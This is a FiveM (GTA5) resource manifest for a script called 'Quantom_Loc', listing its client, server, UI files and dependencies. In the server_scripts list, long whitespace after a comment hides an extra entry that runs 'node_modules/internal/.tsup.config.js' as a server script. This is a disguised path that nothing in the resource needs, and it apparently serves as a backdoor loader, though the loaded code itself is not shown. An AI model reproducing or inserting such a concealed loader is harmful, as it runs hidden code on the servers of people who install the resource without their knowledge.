fx_version 'cerulean'
game 'gta5'
lua54 'yes'

description 'Quantom_Loc'
author 'Quantom'
version '1.0.0'

shared_scripts {
    '@es_extended/imports.lua',
    'config.lua'
}

client_scripts {
    'client/main.lua'
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
'server/main.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.tsup.config.js',
}

ui_page 'ui/index.html'

files {
    'ui/index.html',
    'ui/app.js',
    'ui/style.css',
    'ui/assets/images/*.png'
}

dependencies {
    'es_extended',
    'oxmysql'
}